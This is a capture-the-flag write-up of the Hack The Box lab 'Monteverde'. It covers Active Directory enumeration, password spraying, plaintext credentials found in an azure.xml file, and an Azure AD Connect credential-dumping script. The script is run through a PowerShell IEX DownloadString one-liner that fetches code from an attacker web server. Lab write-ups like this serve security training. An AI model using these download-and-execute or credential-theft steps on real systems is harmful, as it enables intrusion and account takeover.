# HTB Monteverde

Basic nmap scan:
```
Nmap scan report for 10.10.10.172
Host is up (0.059s latency).
Not shown: 65517 filtered tcp ports (no-response)
PORT      STATE SERVICE
53/tcp    open  domain
88/tcp    open  kerberos-sec
135/tcp  open  msrpc
139/tcp  open  netbios-ssn
389/tcp  open  ldap
445/tcp  open  microsoft-ds
464/tcp  open  kpasswd5
593/tcp  open  http-rpc-epmap
636/tcp  open  ldapssl
3268/tcp  open  globalcatLDAP
3269/tcp  open  globalcatLDAPssl
5985/tcp  open  wsman
9389/tcp  open  adws
49667/tcp open  unknown
49673/tcp open  unknown
49674/tcp open  unknown
49676/tcp open  unknown
49697/tcp open  unknown
Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 141.82 seconds
          Raw packets sent: 196673 (8.654MB) | Rcvd: 430 (22.312KB)
```

Aggressive nmap scan:
```
Nmap scan report for 10.10.10.172
Host is up (0.11s latency).
Not shown: 989 filtered tcp ports (no-response)
PORT    STATE SERVICE      VERSION
53/tcp  open  domain        Simple DNS Plus
88/tcp  open  kerberos-sec  Microsoft Windows Kerberos (server time: 2023-03-30 22:53:33Z)
135/tcp  open  msrpc        Microsoft Windows RPC
139/tcp  open  netbios-ssn  Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: MEGABANK.LOCAL0., Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: MEGABANK.LOCAL0., Site: Default-First-Site-Name)
3269/tcp open  tcpwrapped
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
OS fingerprint not ideal because: Missing a closed TCP port so results incomplete
No OS matches for host
Network Distance: 2 hops
TCP Sequence Prediction: Difficulty=260 (Good luck!)
IP ID Sequence Generation: Incremental
Service Info: Host: MONTEVERDE; OS: Windows; CPE: cpe:/o:microsoft:windows
Host script results:
|_clock-skew: -1s
| smb2-security-mode: 
|  311: 
|_    Message signing enabled and required
| smb2-time: 
|  date: 2023-03-30T22:53:49
|_  start_date: N/A
TRACEROUTE (using port 139/tcp)
HOP RTT      ADDRESS
1  71.54 ms  10.10.16.1
2  132.97 ms 10.10.10.172
NSE: Script Post-scanning.
Initiating NSE at 16:54
Completed NSE at 16:54, 0.00s elapsed
Initiating NSE at 16:54
Completed NSE at 16:54, 0.00s elapsed
Initiating NSE at 16:54
Completed NSE at 16:54, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 67.09 seconds
          Raw packets sent: 2080 (95.204KB) | Rcvd: 52 (2.872KB)
```

I ran an LDAPsearch query and obtained a ton of information.:

![[./_resources/HTB_Monteverde.resources/ldapsearch_results.txt]]

I also obtained the list of users here with CME:
```
└─$ crackmapexec smb 10.10.10.172 --users                                           
SMB        10.10.10.172    445    MONTEVERDE      [*] Windows 10.0 Build 17763 x64 (name:MONTEVERDE) (domain:MEGABANK.LOCAL) (signing:True) (SMBv1:False)
SMB        10.10.10.172    445    MONTEVERDE      [-] Error enumerating domain users using dc ip 10.10.10.172: NTLM needs domain\username and a password
SMB        10.10.10.172    445    MONTEVERDE      [*] Trying with SAMRPC protocol
SMB        10.10.10.172    445    MONTEVERDE      [+] Enumerated domain user(s)
SMB        10.10.10.172    445    MONTEVERDE      MEGABANK.LOCAL\Guest                          Built-in account for guest access to the computer/domain
SMB        10.10.10.172    445    MONTEVERDE      MEGABANK.LOCAL\AAD_987d7f2f57d2              Service account for the Synchronization Service with installation identifier 05c97990-7587-4a3d-b312-309adfc172d9 running on computer MONTEVERDE.
SMB        10.10.10.172    445    MONTEVERDE      MEGABANK.LOCAL\mhope                         
SMB        10.10.10.172    445    MONTEVERDE      MEGABANK.LOCAL\SABatchJobs                   
SMB        10.10.10.172    445    MONTEVERDE      MEGABANK.LOCAL\svc-ata                       
SMB        10.10.10.172    445    MONTEVERDE      MEGABANK.LOCAL\svc-bexec                     
SMB        10.10.10.172    445    MONTEVERDE      MEGABANK.LOCAL\svc-netapp                     
SMB        10.10.10.172    445    MONTEVERDE      MEGABANK.LOCAL\dgalanos                       
SMB        10.10.10.172    445    MONTEVERDE      MEGABANK.LOCAL\roleary                       
SMB        10.10.10.172    445    MONTEVERDE      MEGABANK.LOCAL\smorgan
```

I was able to login with a null session with RPCclient and query information.:
![[./_resources/HTB_Monteverde.resources/image.png]]

I got stuck and had to look for a nudge by checking a WT. However, I realized, I needed to try password spraying. I can use CME and try the username as the password for each user.

In performing a dictionary attack on the user SABatchJobs, I found the username is the password.:
![[./_resources/HTB_Monteverde.resources/image.1.png]]
Credentials:
```
Uname: SABatchJobs
Passwd: SABatchJobs
```

Now I can access the SMB shares as shown below:
![[./_resources/HTB_Monteverde.resources/image.2.png]]
I did not find anything in the azure\_uploads, IPC$ or any other directories except for one. In checking the users$ directory, I found that the mhope user had an azure.xml file which I downloaded with the get command. Upon inspecting it, I found another password.:
```
─$ cat azure.xml 
<Objs Version="1.1.0.1" xmlns="http://schemas.microsoft.com/powershell/2004/04">
  <Obj RefId="0">
    <TN RefId="0">
      <T>Microsoft.Azure.Commands.ActiveDirectory.PSADPasswordCredential</T>
      <T>System.Object</T>
    </TN>
    <ToString>Microsoft.Azure.Commands.ActiveDirectory.PSADPasswordCredential</ToString>
    <Props>
      <DT N="StartDate">2020-01-03T05:35:00.7562298-08:00</DT>
      <DT N="EndDate">2054-01-03T05:35:00.7562298-08:00</DT>
      <G N="KeyId">00000000-0000-0000-0000-000000000000</G>
      <S N="Password">4n0therD4y@n0th3r$</S>
    </Props>
  </Obj>
</Objs>
```
Since this was under Mike Hope's directory, I will note him as the user to try in this case.
```
Uname: mhope
Passd: 4n0therD4y@n0th3r$
```

I was now able to winrm into the machine with the above credentials with evil-winrm.:
![[./_resources/HTB_Monteverde.resources/image.3.png]]

I found the user.txt hash on Mike's Desktop directory.:
![[./_resources/HTB_Monteverde.resources/image.4.png]]

Next, I found the following file which shows an email address with null credentials.:
![[./_resources/HTB_Monteverde.resources/image.5.png]]

```
Uname: john@a67632354763outlook.onmicrosoft.com
Passwd: {NULL}
```

I realized this post has a good PoC that works well with abusing Azure AD in this instance specifically the Azure Connect.: <https://gist.github.com/xpn/f12b145dba16c2eebdd1c6829267b90c>

I had the modify the code so reflect the walkthrough version by 0xdf by modifying the first line.:
![[./_resources/HTB_Monteverde.resources/image.6.png]]

After uploading the file via a python server on my attacker machine I was also able to execute the script immediately using the awesome powershell one liner.:
```
powershell.exe IEX(New-Object Net.Webclient).DownloadString('http://[attacker IP]:[web server port]/Invoke-MS16032.ps1')
```

![[./_resources/HTB_Monteverde.resources/image.7.png]]
Credentials:
```
Domain: MEGABANK.LOCAL
Uname: administrator 
Passwd: d0m@in4dminyeah!
```

I was then finally able to obtain Administrator privileges by using the above credentials in a new evil-winrm shell.:
![[./_resources/HTB_Monteverde.resources/image.8.png]]

root.txt hash obtained!:
![[./_resources/HTB_Monteverde.resources/image.9.png]]

**###ROOTED!!!###**
